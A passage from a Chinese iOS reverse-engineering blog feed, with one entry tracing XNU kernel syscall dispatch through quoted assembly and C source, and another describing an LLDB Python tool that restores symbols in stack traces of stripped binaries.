%rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
</feed>
